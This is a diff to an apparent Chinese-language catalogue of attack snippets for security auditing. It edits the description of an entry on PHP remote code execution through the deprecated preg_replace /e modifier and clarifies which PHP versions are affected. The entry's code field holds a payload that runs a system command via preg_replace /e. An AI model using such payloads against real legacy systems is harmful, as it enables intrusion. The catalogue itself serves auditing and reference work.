@@ -152,7 +152,7 @@
       "title": "preg_replace /e 修饰符",
       "category": "PHP 代码执行",
       "code": "preg_replace('/.*/e', 'system(\"id\")', 'x');",
-      "desc": "PHP 5.5 之前 /e 修饰符会把替换结果当作代码执行，老系统审计时关注。",
+      "desc": "/e 修饰符会把替换结果当作 PHP 代码执行：PHP 5.5 起废弃并产生 E_DEPRECATED，PHP 7.0 起彻底移除，仅在老系统审计时关注。",
       "tags": ["rce", "php", "legacy"],
       "vars": [],
       "risk": "attack",
